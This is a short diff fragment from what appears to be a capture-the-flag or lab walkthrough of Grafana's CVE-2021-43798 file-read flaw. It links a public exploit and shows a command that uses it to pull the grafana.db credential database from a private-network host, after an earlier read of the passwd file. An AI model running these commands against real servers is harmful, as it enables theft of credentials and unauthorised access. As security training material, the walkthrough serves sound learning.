@@ -23,7 +23,7 @@ sysadmin:x:1001:1001::/home/sysadmin:/bin/sh
 ```
 since we can read file, we will read the log file to find the passwd  
 https://github.com/jas502n/Grafana-CVE-2021-43798?tab=readme-ov-file          
-from this instruction, we can find the password in /var/lib/grafana/grafana.db 
+from this instruction, we can find the password in /var/lib/grafana/grafana.db        
 but the output is too big, we redirect it to a txt file and check it
 ```console
 $ python3 CVE_2021_43798.py -f /var/lib/grafana/grafana.db 192.168.175.181:3000 > 1.txt
